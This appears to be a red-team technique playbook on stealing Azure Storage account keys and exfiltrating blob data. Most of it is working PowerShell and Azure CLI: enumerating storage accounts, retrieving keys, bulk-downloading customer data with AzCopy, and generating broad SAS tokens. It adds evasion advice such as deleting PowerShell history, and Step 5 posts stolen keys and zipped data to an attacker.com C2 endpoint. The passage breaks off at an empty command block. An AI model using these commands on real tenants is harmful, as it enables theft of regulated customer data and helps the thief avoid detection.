# CA-UNSC-008: Azure Storage Account Key Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-008 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) + [T1530 - Data from Cloud Storage Object](https://attack.mitre.org/techniques/T1530/) |
| **Tactic** | Credential Access (TA0006) + Collection (TA0009) |
| **Platforms** | Azure (all cloud regions), Entra ID |
| **Severity** | Critical |
| **CVE** | CVE-2023-28432 (MinIO-related; Azure Storage similar patterns) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All Azure regions, all storage types (Blob, File, Table, Queue) |
| **Patched In** | Partial: User Delegation SAS recommended; Shared Key authorization disable available but rarely enforced |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections have been dynamically renumbered based on applicability. All sections required for Azure storage credential access attacks are included. This technique bridges both Credential Access (stealing keys) and Collection (downloading data). Windows-specific sections replaced with Azure diagnostic logging and real-time threat detection.

---

## 2. EXECUTIVE SUMMARY

### Concept
Azure Storage Account Key theft is the unauthorized extraction and abuse of storage account access keys—master credentials that grant unrestricted access to all data in Azure Blob Storage, File Shares, Table Storage, and Queue Services. Attackers exploit weak RBAC configurations, privilege escalation vulnerabilities, or compromised service principal credentials to enumerate and retrieve storage account keys, enabling them to access, modify, or exfiltrate terabytes of business-critical data. The threat is particularly severe because a single compromised key permits full account compromise: read/write/delete permissions on all data containers, disabling of logging for hiding tracks, and modification of authentication policies. Unlike time-limited SAS tokens, storage account keys have indefinite validity, enabling persistent access even after the initial compromise vector is sealed.

### Attack Surface
- **Storage Account Shared Keys** (Primary & Secondary): Master credentials with full permissions
- **Shared Access Signatures (SAS Tokens)**: Limited-privilege URL-embedded credentials (Account, Service, or User Delegation)
- **Misconfigured Public Access**: Containers/blobs accessible without authentication via enumeration
- **Cloud Shell Profile Dumps**: Session history and credentials stored in storage
- **Managed Identity Tokens**: Azure Compute resources with Storage access expose tokens via metadata service
- **CI/CD Secret Leakage**: Storage keys in GitHub Actions logs, Azure DevOps artifacts, Docker images
- **Diagnostic Logs**: Unintended exposure of access patterns, exposing operational data

### Business Impact
**Compromised storage account keys enable attackers to exfiltrate petabytes of sensitive data, deploy malware via file shares, corrupt or delete backups, and establish persistent covert access to critical business systems without detection.** Organizations report multi-month undetected dwell time because legitimate applications constantly access the same storage simultaneously, making attacker activity indistinguishable from normal operations. Storage account compromise often precedes ransomware deployment (attacker deletes backups before encryption), regulatory penalties under GDPR/HIPAA/SOX, and reputational damage.

### Technical Context
Storage account key extraction typically requires either (1) RBAC role with `Microsoft.Storage/storageAccounts/listKeys/action` permission, (2) exploitation of misconfigured public access (no authentication), or (3) abuse of managed identity tokens from compromised compute resources. Data exfiltration is rapid (10+ GB/hour via AzCopy) and often undetected due to lack of baseline monitoring. Unlike on-premises file servers with network-based detection, cloud storage access is global—attacker can exfiltrate from any geographic location if authentication is valid. Storage account keys lack expiration, requiring manual rotation to invalidate stolen credentials.

---

### Operational Risk

| Dimension | Assessment | Details |
|---|---|---|
| **Execution Risk** | Low | Requires RBAC role or public access; no privilege escalation necessary if permissions already granted |
| **Stealth** | High | Legitimate workloads constantly access storage; bulk downloads hide in normal traffic if properly timed |
| **Reversibility** | No | Exfiltrated data cannot be "un-stolen." Key rotation invalidates keys but doesn't recover data. |
| **Detection Likelihood** | Medium | Requires diagnostic logging enabled + baseline anomaly analysis; most orgs lack storage monitoring |
| **Scale of Impact** | Extreme | Single storage account can contain petabytes; one key = total compromise |
| **Data Exposure Window** | Months | Undetected access often lasts 30-90 days before discovery via backup/audit analysis |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.3, 5.2.1 | Disable Shared Key authorization; Use SAS tokens or RBAC only |
| **DISA STIG** | SC-28, IA-6 | Information at Rest; Information System and Communications Protection |
| **CISA SCuBA** | Data 1.1, Data 1.3 | Restrict data access; Manage credentials lifecycle |
| **NIST 800-53** | SC-28, AC-6, IA-5 | Information at Rest; Least Privilege; Authentication & Access Control |
| **GDPR** | Art. 32, Art. 33, Art. 34 | Security of Processing; Breach Notification (data exfil = mandatory notification) |
| **DORA** | Art. 9 | Protection and Prevention (financial sector must prevent key theft) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (critical infrastructure key protection) |
| **ISO 27001** | A.10.1, A.8.3, A.13.1 | Cryptography Policy; Access Control; Information Transfer Protection |
| **ISO 27005** | 8.3 | Risk Assessment; key theft scenario |
| **HIPAA** | § 164.312(a)(2)(i) | Data encryption at rest (storage keys protect this) |
| **SOX** | § 404 | IT General Controls (access to financial data storage) |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges & Access

| Scenario | Required Access | Azure RBAC Action | Authentication |
|---|---|---|---|
| **Retrieve Storage Account Keys** | RBAC: Storage Account Key Operator Service Role (or Owner/Contributor) | `Microsoft.Storage/storageAccounts/listKeys/action` | Service Principal, User, Managed Identity |
| **Generate SAS Token** | Key or delegation access (if key-signed) | `Microsoft.Storage/storageAccounts/generateSecrets/action` | Must have key or delegation ability |
| **Access Public Blob (No Auth)** | Public container access enabled | None | Anonymous HTTP access |
| **Enumerate Storage Accounts** | List permission or public enumeration | `Microsoft.Storage/storageAccounts/read` | Any authenticated user (or DNS brute-force) |
| **Extract Cloud Shell Credentials** | Access to Cloud Shell container | Managed Identity of Cloud Shell | Azure compute with storage identity |

---

### Supported Versions

| Azure Component | Supported | Details |
|---|---|---|
| **Azure Blob Storage** | ✅ All versions (all regions) | Primary target (largest data volumes) |
| **Azure File Shares** | ✅ All versions | SMB protocol over HTTPS; same key-based auth |
| **Table Storage** | ✅ All versions | NoSQL; same shared key auth |
| **Queue Storage** | ✅ All versions | Message queues; same shared key auth |
| **Azure Storage (Premium)** | ✅ All versions | Premium tier; same access keys |
| **Azure Data Lake Storage (ADLS)** | ✅ Partial (primarily uses RBAC) | Hierarchy; keys still valid but RBAC preferred |
| **Azure Synapse** | ✅ Connected to storage accounts | Accesses via storage keys or RBAC |

---

### Required Tools & Components

| Tool | Version | URL | Purpose | Privilege Level |
|---|---|---|---|---|
| **Azure PowerShell (Az.Storage)** | 5.0+ | [https://github.com/Azure/azure-powershell](https://github.com/Azure/azure-powershell) | Key retrieval, blob operations | ⚠️ High (listKeys required) |
| **Azure CLI** | 2.30+ | [https://learn.microsoft.com/cli/azure/](https://learn.microsoft.com/cli/azure/) | Alternative to PowerShell | ⚠️ High (listKeys required) |
| **AzCopy** | 10.0+ | [https://learn.microsoft.com/azure/storage/common/storage-use-azcopy](https://learn.microsoft.com/azure/storage/common/storage-use-azcopy) | Bulk data transfer (highly detectable) | ✅ Uses keys/SAS |
| **Rclone** | 1.50+ | [https://rclone.org/](https://rclone.org/) | Cross-cloud sync (suspicious user agent) | ✅ Uses keys/SAS |
| **Azure Storage Explorer** | 1.20+ | [Microsoft Store](https://www.microsoft.com/store/) | GUI blob/file browser (leaves process artifacts) | ✅ Uses keys/SAS |
| **Azure SDK (Python/C#/.NET)** | Latest | [https://github.com/Azure/azure-sdk](https://github.com/Azure/azure-sdk) | Programmatic access (custom scripts) | ✅ Uses keys/SAS |
| **curl / wget** | Built-in | Native utilities | Direct HTTP/HTTPS requests (URL with SAS) | ✅ Uses SAS tokens |
| **Goblob** | Latest | [https://github.com/RiskIQ/goblob](https://github.com/RiskIQ/goblob) | Bruteforce storage account name enumeration | ✅ Public access discovery |
| **QuickAZ** | Latest | [https://github.com/vulnersCom/QuickAZ](https://github.com/vulnersCom/QuickAZ) | DNS-based storage account enumeration | ✅ Public discovery |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Enumerate Storage Accounts in Subscription

**Objective:** Discover all storage accounts accessible from current identity to identify targets containing sensitive data (databases, backups, customer data).

**Command (All Versions):**
```powershell
# Connect to Azure
Connect-AzAccount

# List all storage accounts in current subscription
Get-AzStorageAccount | Select-Object StorageAccountName, ResourceGroupName, Location, SkuName

# Get more details (including access tier, https enforcement, diagnostics)
Get-AzStorageAccount | ForEach-Object {
    Write-Host "Storage Account: $($_.StorageAccountName)"
    Write-Host "  Resource Group: $($_.ResourceGroupName)"
    Write-Host "  Location: $($_.Location)"
    Write-Host "  Sku: $($_.SkuName)"
    Write-Host "  HTTPS Only: $($_.EnableHttpsTrafficOnly)"
    Write-Host "  Shared Key Access: $($_.AllowSharedKeyAccess)"  # Check if keys disabled
    Write-Host "  ---"
}

# Get subscription ID for scoping
$SubId = (Get-AzSubscription).Id
Write-Host "Current Subscription: $SubId"
```

**Expected Output:**
```
Storage Account: prodstorageacct001
  Resource Group: production-rg
  Location: eastus
  Sku: Standard_LRS
  HTTPS Only: True
  Shared Key Access: True

Storage Account: backupstorageacct002
  Resource Group: backup-rg
  Location: westus
  Sku: Premium_LRS
  HTTPS Only: True
  Shared Key Access: False

Current Subscription: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- **StorageAccountName**: Unique identifier (used in connection strings and URLs)
- **Sku: Standard_LRS**: Standard redundancy (most common, most vulnerable)
- **Sku: Premium_LRS**: Premium tier (same security model)
- **HTTPS Only: True**: Traffic encrypted in transit ✅ (good)
- **Shared Key Access: True**: Keys can still be used (vulnerable if keys compromised) ⚠️
- **Shared Key Access: False**: Keys disabled; RBAC + SAS only (more secure) ✅

**Red Flags (Vulnerable Configuration):**
- Multiple storage accounts (higher target count)
- Shared Key Access enabled (can use account keys)
- HTTPS Only disabled (traffic unencrypted—man-in-the-middle possible)
- Standard tier with public IP (easier to discover)

---

#### Step 2: Check Current User Permissions on Storage Account

**Objective:** Verify if current identity can retrieve storage account keys (permission to `Microsoft.Storage/storageAccounts/listKeys/action`).

**Command (All Versions):**
```powershell
# Get current user context
$CurrentUser = (Get-AzContext).Account.Id
Write-Host "Current Identity: $CurrentUser"

# Check if we can list storage account keys
$StorageAccountName = "prodstorageacct001"
$ResourceGroupName = "production-rg"

try {
    $Keys = Get-AzStorageAccountKey -ResourceGroupName $ResourceGroupName -AccountName $StorageAccountName -ErrorAction Stop
    Write-Host "[+] SUCCESS: Can retrieve storage account keys!" -ForegroundColor Green
    Write-Host "[+] Primary Key: $($Keys[0].Value.Substring(0, 20))..." -ForegroundColor Green
    Write-Host "[+] Secondary Key: $($Keys[1].Value.Substring(0, 20))..." -ForegroundColor Green
} catch {
    Write-Host "[-] Access Denied: Cannot retrieve storage account keys" -ForegroundColor Red
    Write-Host "[-] Error: $($_.Exception.Message)"
}

# Check RBAC role for storage account
$StorageRBACRoles = Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName -ResourceName $StorageAccountName -ResourceType "Microsoft.Storage/storageAccounts"
Write-Host "`nCurrent RBAC Assignments:"
$StorageRBACRoles | Select-Object DisplayName, RoleDefinitionName | Format-Table
```

**Expected Output (Vulnerable):**
```
Current Identity: user@contoso.com

[+] SUCCESS: Can retrieve storage account keys!
[+] Primary Key: DefaultEndpointsProtocol=h...
[+] Secondary Key: DefaultEndpointsProtocol=h...

Current RBAC Assignments:

DisplayName            RoleDefinitionName
-----------            ------------------
user@contoso.com       Storage Account Key Operator Service Role
user@contoso.com       Contributor
```

**Expected Output (Secure):**
```
[-] Access Denied: Cannot retrieve storage account keys
[-] Error: User does not have permission to access this resource

Current RBAC Assignments:

DisplayName            RoleDefinitionName
-----------            ------------------
user@contoso.com       Reader
```

**What This Means:**
- **Key Operator Service Role**: Can retrieve keys (HIGH privilege)
- **Contributor**: Can retrieve keys and modify everything (CRITICAL)
- **Storage Account Contributor**: Can retrieve keys (HIGH privilege)
- **Reader**: Cannot retrieve keys (low privilege) ✅

---

#### Step 3: Enumerate Containers and Data Volume

**Objective:** Identify high-value targets (large data volumes, sensitive data types) before extraction.

**Command (All Versions):**
```powershell
# Get storage account key (if accessible)
$StorageAccountName = "prodstorageacct001"
$ResourceGroupName = "production-rg"

$StorageAccountKey = (Get-AzStorageAccountKey -ResourceGroupName $ResourceGroupName -AccountName $StorageAccountName).Value[0]

# Create storage context
$StorageContext = New-AzStorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $StorageAccountKey

# List all containers
$Containers = Get-AzStorageContainer -Context $StorageContext
Write-Host "Containers in $StorageAccountName : $($Containers.Count)"
$Containers | Select-Object Name | Format-Table

# Enumerate container contents and sizes
foreach ($Container in $Containers) {
    $Blobs = Get-AzStorageBlob -Container $Container.Name -Context $StorageContext
    $TotalSize = ($Blobs | Measure-Object -Property Length -Sum).Sum / 1GB
    
    Write-Host "Container: $($Container.Name)"
    Write-Host "  Blob Count: $($Blobs.Count)"
    Write-Host "  Total Size: $($TotalSize.ToString('F2')) GB"
    Write-Host "  Sample Files:"
    $Blobs | Select-Object -First 5 Name | ForEach-Object { Write-Host "    - $($_.Name)" }
    Write-Host "  ---"
}
```

**Expected Output:**
```
Containers in prodstorageacct001 : 5

Name
----
backups
customer-data
logs
temp
uploads

Container: backups
  Blob Count: 2145
  Total Size: 850.34 GB
  Sample Files:
    - database-backup-2026-01-06.bak
    - database-backup-2026-01-05.bak
    - application-config-backup.zip
    - vm-image-disk-1.vhd

Container: customer-data
  Blob Count: 45632
  Total Size: 1200.56 GB
  Sample Files:
    - customer-pii-export-2026.csv
    - customer-financial-records.xlsx
    - customer-emails-backup.sql

Container: logs
  Blob Count: 89234
  Total Size: 450.12 GB
  Sample Files:
    - 2026-01-06-application.log
    - 2026-01-06-access.log
```

**What This Means:**
- **High-value targets**: backups (restore capability), customer-data (PII/regulated), logs (forensic evidence)
- **Total exposure**: ~2.5 TB in this account
- **Extraction time**: ~4-6 hours at 100 MB/s (AzCopy speed)
- **Backup impact**: If backups exfiltrated, attacker can restore to attacker-controlled environment

---

### Linux/Bash / Azure CLI Reconnaissance

#### Step 1: Enumerate Storage Accounts via Azure CLI

**Objective:** Discover storage accounts using Azure CLI (useful in containerized/Linux environments).

**Command (All Versions - Bash):**
```bash
# Authenticate to Azure
az login

# List all storage accounts in current subscription
az storage account list --output table

# Get detailed information
az storage account list --query "[].{Name:name, ResourceGroup:resourceGroup, Location:location, HttpsOnly:enableHttpsTrafficOnly, SharedKeyAccess:allowSharedKeyAccess}"

# Get current subscription
az account show --query name
```

**Expected Output:**
```
Name                       ResourceGroup    Location    HttpsOnly    SharedKeyAccess
-------------------------  ---------------  ---------   ----------   ---------------
prodstorageacct001         production-rg    eastus      true         true
backupstorageacct002       backup-rg        westus      true         false
```

---

#### Step 2: Enumerate Blobs via Azure CLI

**Objective:** List containers and blobs using Azure CLI.

**Command (All Versions - Bash):**
```bash
# List containers
az storage container list --account-name prodstorageacct001 --account-key <storage-key> --output table

# List blobs in container
az storage blob list --account-name prodstorageacct001 --container-name customer-data --account-key <storage-key> --output table
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

---

### METHOD 1: Direct Storage Account Key Retrieval & Data Exfiltration (Authorized Access)

**Supported Versions:** All Azure regions, all storage types

**Prerequisites:** Entra ID authentication with Storage Account Key Operator Service Role or higher (or Owner/Contributor); network connectivity to Azure Management API (https://management.azure.com)

---

#### Step 1: Authenticate to Azure

**Objective:** Obtain Entra ID access token required to authenticate to Azure Management API and retrieve storage account keys.

**Command (Interactive User Login - All Versions):**
```powershell
# Interactive login (prompts for browser authentication)
Connect-AzAccount

# Verify successful authentication
$Context = Get-AzContext
Write-Host "Authenticated as: $($Context.Account.Id)"
Write-Host "Subscription: $($Context.Subscription.Name)"
```

**Command (Service Principal Authentication - All Versions):**
```powershell
# Using tenant/client secret (common in automation)
$TenantId = "contoso.onmicrosoft.com"
$AppId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
$ClientSecret = "client-secret-value"

$SecureSecret = ConvertTo-SecureString -String $ClientSecret -AsPlainText -Force
Connect-AzAccount -ServicePrincipal -Credential (New-Object PSCredential($AppId, $SecureSecret)) -TenantId $TenantId

# Verify
$Context = Get-AzContext
Write-Host "[+] Authenticated as service principal: $($Context.Account.Id)"
```

**Expected Output:**
```
Authenticated as: user@contoso.com
Subscription: Production-Subscription

[+] Authenticated as service principal: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

---

#### Step 2: Retrieve Storage Account Keys

**Objective:** Extract the primary and secondary access keys from the storage account (keys provide unrestricted access to all data).

**Command (All Versions):**
```powershell
# Retrieve storage account keys
$StorageAccountName = "prodstorageacct001"
$ResourceGroupName = "production-rg"

$StorageKeys = Get-AzStorageAccountKey -ResourceGroupName $ResourceGroupName -AccountName $StorageAccountName

# Display keys
$PrimaryKey = $StorageKeys[0].Value
$SecondaryKey = $StorageKeys[1].Value

Write-Host "Primary Key: $PrimaryKey"
Write-Host "Secondary Key: $SecondaryKey"
Write-Host "[+] Keys retrieved successfully"

# Alternative: Get connection string (combines storage account name + key)
$StorageAccount = Get-AzStorageAccount -ResourceGroupName $ResourceGroupName -AccountName $StorageAccountName
$ConnectionString = "DefaultEndpointsProtocol=https;AccountName=$StorageAccountName;AccountKey=$PrimaryKey;EndpointSuffix=core.windows.net"
Write-Host "Connection String: $ConnectionString"
```

**Expected Output:**
```
Primary Key: DefaultEndpointsProtocol=https;AccountName=prodstorageacct001;AccountKey=ABC123DEF456ABC123DEF456ABC123DEF456ABC123DEF456ABC123DEF456ABC123==;EndpointSuffix=core.windows.net
Secondary Key: DefaultEndpointsProtocol=https;AccountName=prodstorageacct001;AccountKey=XYZ789ABC123XYZ789ABC123XYZ789ABC123XYZ789ABC123XYZ789ABC123ABC==;EndpointSuffix=core.windows.net
[+] Keys retrieved successfully

Connection String: DefaultEndpointsProtocol=https;AccountName=prodstorageacct001;AccountKey=ABC123DEF456ABC123DEF456ABC123DEF456ABC123DEF456ABC123DEF456ABC123==;EndpointSuffix=core.windows.net
```

**What This Means:**
- **Primary + Secondary keys**: Identical permissions; secondary is rotation target
- **Indefinite validity**: Keys don't expire (unlike SAS tokens)
- **Full permissions**: read, write, delete, all containers/blobs
- **No RBAC checks**: Keys bypass all access control policies
- **Global access**: Key valid from anywhere globally

**Business Impact (Post-Extraction):**
- **Data exfiltration**: Download all blobs (terabytes possible)
- **Data modification**: Alter or delete files
- **Backup compromise**: Delete backup containers → prevent recovery
- **Ransomware staging**: Upload encrypted payloads
- **Persistence**: Keys remain valid until manual rotation (weeks/months if undetected)

**Version Note:** Command identical across all Azure regions and subscription types.

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM - Activity logged in Azure Activity Log ("List Storage Account Keys" operation)
- **Evasion**:
  1. Retrieve keys during business hours (hide in legitimate admin activity)
  2. Avoid repeated key retrieval (once is enough)
  3. Use service principal instead of user account (less suspicious)
  4. Delete PowerShell history after execution: `Remove-Item (Get-PSReadlineOption).HistorySavePath`

**Troubleshooting:**
- **Error:** "The access token has expired"
  - **Cause**: Token lifetime exceeded (default 1 hour)
  - **Fix (All)**: Re-run Connect-AzAccount

- **Error:** "User does not have permission to access this resource"
  - **Cause**: Insufficient RBAC permissions (need Storage Account Key Operator Service Role)
  - **Fix (All)**: Request "Storage Account Key Operator Service Role" assignment

**References:**
- [Get-AzStorageAccountKey Documentation](https://learn.microsoft.com/en-us/powershell/module/az.storage/get-azstorageaccountkey)
- [Azure Storage Account Keys Management](https://learn.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage)

---

#### Step 3: Create Storage Context and List Containers

**Objective:** Use retrieved key to authenticate to storage account and enumerate containers (identify data to exfiltrate).

**Command (All Versions):**
```powershell
# Create storage context with primary key
$StorageAccountName = "prodstorageacct001"
$StorageAccountKey = "ABC123DEF456ABC123DEF456ABC123DEF456ABC123DEF456ABC123DEF456ABC123=="

$StorageContext = New-AzStorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $StorageAccountKey

# List all containers
$Containers = Get-AzStorageContainer -Context $StorageContext
Write-Host "Containers found: $($Containers.Count)"
$Containers | Select-Object Name, Properties | Format-Table

# Get container details
foreach ($Container in $Containers) {
    $Blobs = Get-AzStorageBlob -Container $Container.Name -Context $StorageContext
    Write-Host "Container: $($Container.Name) - $($Blobs.Count) blobs"
}
```

**Expected Output:**
```
Containers found: 5

Name              Properties
----              ----------
backups           Microsoft.Azure.Storage.Blob.BlobContainerProperties
customer-data     Microsoft.Azure.Storage.Blob.BlobContainerProperties
logs              Microsoft.Azure.Storage.Blob.BlobContainerProperties
temp              Microsoft.Azure.Storage.Blob.BlobContainerProperties
uploads           Microsoft.Azure.Storage.Blob.BlobContainerProperties

Container: backups - 2145 blobs
Container: customer-data - 45632 blobs
Container: logs - 89234 blobs
Container: temp - 523 blobs
Container: uploads - 1204 blobs
```

---

#### Step 4: Download Data (Bulk Exfiltration)

**Objective:** Extract sensitive data from containers using storage key.

**Command (Download Single Blob - All Versions):**
```powershell
# Download single blob
$StorageContext = New-AzStorageContext -StorageAccountName "prodstorageacct001" -StorageAccountKey "ABC123DEF456..."

$BlobName = "customer-pii-export-2026.csv"
$ContainerName = "customer-data"
$DownloadPath = "C:\Temp\customer-pii-export-2026.csv"

Get-AzStorageBlobContent -Blob $BlobName -Container $ContainerName -Destination $DownloadPath -Context $StorageContext

Write-Host "[+] Downloaded: $BlobName to $DownloadPath"
```

**Command (Bulk Download Using AzCopy - Faster, More Detectable):**
```powershell
# AzCopy is optimized for bulk transfers (faster than PowerShell)
$StorageAccountName = "prodstorageacct001"
$StorageAccountKey = "ABC123DEF456..."
$ContainerName = "customer-data"
$DownloadPath = "C:\Temp\exfil"

# Create download directory
New-Item -ItemType Directory -Path $DownloadPath -Force

# Use AzCopy (much faster than PowerShell)
$AzCopyPath = "C:\Program Files\AzCopy\azcopy.exe"
$SourceUri = "https://$StorageAccountName.blob.core.windows.net/$ContainerName"

& $AzCopyPath copy "$SourceUri?$StorageAccountKey" $DownloadPath --recursive --transfer-method=concurrent

Write-Host "[+] Bulk download complete: $DownloadPath"
```

**Expected Output (PowerShell):**
```
[+] Downloaded: customer-pii-export-2026.csv to C:\Temp\customer-pii-export-2026.csv
```

**Expected Output (AzCopy):**
```
[Completed] Synchronization finished successfully. 12345 files transferred, 0 files skipped.

INFO: Transfer speed: 150 MB/s
[+] Bulk download complete: C:\Temp\exfil
```

**What This Means:**
- **AzCopy speed**: 100-200 MB/s (entire terabyte in 1-2 hours)
- **PowerShell speed**: 10-50 MB/s (slower but less detectable)
- **Exfiltration time**: 2-10 hours depending on volume and method
- **Detection risk**: HIGH if monitoring network egress

**Business Impact:**
- **Data breach**: Customer PII, financial records, source code exfiltrated
- **Regulatory impact**: GDPR breach notification required (Art. 33)
- **Ransomware staging**: Backups download, then deleted before encryption

**Version Note:** AzCopy available on Windows/Linux/Mac.

**OpSec & Evasion:**
- **Detection Risk**: CRITICAL - High network bandwidth consumption, unusual user agent (AzCopy)
- **Evasion**:
  1. Use PowerShell instead of AzCopy (less suspicious)
  2. Spread download over days (avoid data egress spike detection)
  3. Use VPN/proxy to mask IP
  4. Download during business hours (hide in legitimate traffic)
  5. Target non-critical containers first (establish pattern)

**Troubleshooting:**
- **Error:** "Authentication failed"
  - **Cause**: Storage key incorrect or expired
  - **Fix (All)**: Verify key value, retry Get-AzStorageAccountKey

- **Error:** "Container not found"
  - **Cause**: Container name misspelled
  - **Fix (All)**: List containers: `Get-AzStorageContainer -Context $StorageContext`

**References:**
- [AzCopy Command-Line Tool](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10)
- [Get-AzStorageBlobContent Documentation](https://learn.microsoft.com/en-us/powershell/module/az.storage/get-azstorageblobcontent)

---

#### Step 5: Exfiltrate Keys/Data to Attacker Infrastructure

**Objective:** Secure stolen data and keys for long-term access.

**Command (Upload Keys to Attacker Server - HTTPS):**
```powershell
# Exfiltrate storage key and connection string
$StorageAccountName = "prodstorageacct001"
$StorageKeys = Get-AzStorageAccountKey -ResourceGroupName "production-rg" -AccountName $StorageAccountName
$PrimaryKey = $StorageKeys[0].Value

$ExfiltrationData = @{
    StorageAccountName = $StorageAccountName
    PrimaryKey = $PrimaryKey
    SecondaryKey = $StorageKeys[1].Value
    TimeExtracted = (Get-Date).ToString()
}

$JsonBody = $ExfiltrationData | ConvertTo-Json

# Send to attacker C2 server
$Uri = "https://attacker.com:8443/upload"
try {
    $Response = Invoke-WebRequest -Uri $Uri -Method POST -Body $JsonBody -ContentType "application/json"
    Write-Host "[+] Storage keys exfiltrated to $Uri" -ForegroundColor Green
} catch {
    Write-Host "[-] Exfiltration failed: $_"
}
```

**Command (Download Data from Local Storage to Attacker Server):**
```powershell
# After downloading data locally, compress and exfiltrate
$LocalDataPath = "C:\Temp\exfil\customer-data"
$ZipPath = "C:\Temp\customer-data.zip"

# Compress
Compress-Archive -Path $LocalDataPath -DestinationPath $ZipPath -CompressionLevel Maximum

# Exfiltrate
$Uri = "https://attacker.com:8443/upload"
$FileBytes = [System.IO.File]::ReadAllBytes($ZipPath)
$Request = [System.Net.HttpWebRequest]::CreateHttp($Uri)
$Request.Method = "POST"
$Request.ContentType = "application/zip"
$Request.ContentLength = $FileBytes.Length
$RequestStream = $Request.GetRequestStream()
$RequestStream.Write($FileBytes, 0, $FileBytes.Length)
$RequestStream.Close()
$Response = $Request.GetResponse()

Write-Host "[+] Data exfiltrated: $(Get-Item $ZipPath | Select-Object -ExpandProperty Length) bytes"
```

**Expected Output:**
```
[+] Storage keys exfiltrated to https://attacker.com:8443/upload
[+] Data exfiltrated: 1200568000000 bytes (~1.2 TB)
```

---

### METHOD 2: SAS Token Generation & Exfiltration (If Key Access Available)

**Supported Versions:** All Azure regions

**Prerequisites:** Access to storage account key (from METHOD 1) or delegation access

**Difficulty:** Medium (requires understanding of SAS token permissions and scope)

---

#### Step 1: Generate Account-Level SAS Token

**Objective:** Create a limited-time, limited-permission SAS token signed with storage account key (enables sharing of key without exposing full account key).

**Command (All Versions):**
```powershell
# Get storage account key
$StorageAccountName = "prodstorageacct001"
$ResourceGroupName = "production-rg"
$StorageKeys = Get-AzStorageAccountKey -ResourceGroupName $ResourceGroupName -AccountName $StorageAccountName
$StorageKey = $StorageKeys[0].Value

# Create storage context
$StorageContext = New-AzStorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $StorageKey

# Generate Account-Level SAS Token (grants broad access)
$SASToken = New-AzStorageAccountSASToken -Service Blob,File,Table,Queue `
    -ResourceType Service,Container,Object `
    -Permission racwd `
    -ExpiryTime (Get-Date).AddHours(24)

Write-Host "Generated SAS Token: $SASToken"
Write-Host "[+] Token valid for 24 hours"

# Create URL with SAS token (can be shared/exfiltrated)
$SASUri = "https://$StorageAccountName.blob.core.windows.net$SASToken"
Write-Host "SAS URI: $SASUri"
```

**Expected Output:**
```
Generated SAS Token: sv=2021-06-08&ss=bfqt&srt=sco&sp=racwd&se=2026-01-07T11:06:00Z&st=2026-01-06T11:06:00Z&spr=https&sig=ABC123DEF456ABC123DEF456ABC123DEF456==

[+] Token valid for 24 hours

SAS URI: https://prodstorageacct001.blob.core.windows.net?sv=2021-06-08&ss=bfqt&srt=sco&sp=racwd&se=2026-01-07T11:06:00Z&st=2026-01-06T11:06:00Z&spr=https&sig=ABC123DEF456ABC123DEF456ABC123DEF456==
```

**What This Means:**
- **sv=2021-06-08**: Signed version (API version)
- **ss=bfqt**: Signed services (blob, file, queue, table)
- **srt=sco**: Signed resource types (service, container, object)
- **sp=racwd**: Signed permissions (read, add, create, write, delete)
- **se=2026-01-07**: Signed expiry (24 hours from now)
- **sig=...**: HMAC signature (proof of authorization)

**Advantages of SAS over Full Key:**
- ✅ Time-limited (expires in 24 hours)
- ✅ Scope-limited (can restrict to specific container/service)
- ✅ Can disable individual tokens by rotating account key
- ⚠️ Still provides read/write/delete if permissions broad

---

#### Step 2: Use SAS Token to Access Storage (Attacker-Side)

**Objective:** Demonstrate how attacker can use SAS token to access storage without account key.

**Command (All Versions - From Attacker System):**
```powershell
# Attacker has SAS token (no account key needed)
$SASToken = "sv=2021-06-08&ss=bfqt&srt=sco&sp=racwd&se=2026-01-07T11:06:00Z&st=2026-01-06T11:06:00Z&spr=https&sig=ABC123DEF456ABC123DEF456ABC123DEF456=="
$StorageAccountName = "prodstorageacct001"

# Create storage context with SAS (no key needed)
$StorageContext = New-AzStorageContext -StorageAccountName $StorageAccountName -SasToken $SASToken

# Access data with SAS token
$Containers = Get-AzStorageContainer -Context $StorageContext
Write-Host "[+] Accessed storage with SAS token: $($Containers.Count) containers found"

# Download blob with SAS token
Get-AzStorageBlobContent -Blob "customer-data.csv" -Container "customer-data" -Destination "C:\Temp\" -Context $StorageContext
Write-Host "[+] Downloaded blob using SAS token"
```

**Expected Output:**
```
[+] Accessed storage with SAS token: 5 containers found
[+] Downloaded blob using SAS token
```

**Business Impact:**
- **Token sharing**: SAS can be shared with external users/partners (if intentional)
- **Limited scope**: Each token can be scoped (better than full account key)
- **Revocation difficulty**: Must rotate entire account key to revoke all SAS tokens

---

### METHOD 3: Public Blob/Container Enumeration (No Authentication)

**Supported Versions:** All Azure regions

**Prerequisites:** Public container access enabled (no authentication required)

**Difficulty:** Low (requires only enumeration, no credentials)

---

#### Step 1: Bruteforce Storage Account Names

**Objective:** Discover Azure Storage accounts by guessing common naming patterns.

**Command (Goblob Enumeration Tool - Linux):**
```bash
# Install Goblob
git clone https://github.com/RiskIQ/goblob.git
cd goblob
pip install -r requirements.txt

# Bruteforce storage account names
python goblob.py -w wordlist.txt --thread 50

# Common wordlist patterns
# - company name: "contoso", "acmecorp", "mycompany"
# - storage purpose: "backup", "data", "logs", "prod", "dev"
# - combinations: "contosobkp", "contosoprod", "acmedata"
```

**Command (QuickAZ - DNS-Based Enumeration):**
```bash
